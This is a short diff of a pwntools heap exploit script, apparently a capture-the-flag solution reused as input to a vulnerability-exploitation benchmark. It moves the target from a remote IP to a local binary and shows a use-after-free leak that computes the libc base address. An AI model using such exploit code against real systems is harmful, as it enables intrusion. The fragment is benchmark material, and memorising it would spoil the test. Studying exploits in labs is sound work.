@@ -11,12 +11,12 @@ from pwnlib.util.packing import p8
 from pwn import *
 from ctypes import *
 context(os='linux', arch='amd64', log_level='debug')
-# p = process("/home/zp9080/PWN/pwn")
+p = process("/root/llm4vea/inputs/benchmarks/heap/vuln1/pwn")
 # p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x4013D2')
-p=remote('125.220.147.45',49174)
+# p=remote('125.220.147.45',49174)
 # p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
-# elf = ELF("/home/zp9080/PWN/pwn")
-libc=ELF("/home/zp9080/PWN/libc.so.6")
+elf = ELF("/root/llm4vea/inputs/benchmarks/heap/vuln1/pwn")
+libc=ELF("/root/llm4vea/inputs/benchmarks/heap/vuln1/libc.so.6")
 
 #b *$rebase(0x14F5)
 def dbg():
@@ -52,7 +52,7 @@ add(1,0x4f0,b'aaaa')
 
 delete(0)
 show(0)
-# dbg()
+dbg()
 libcbase=u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))-0x1ecbe0
 print(hex(libcbase))
 
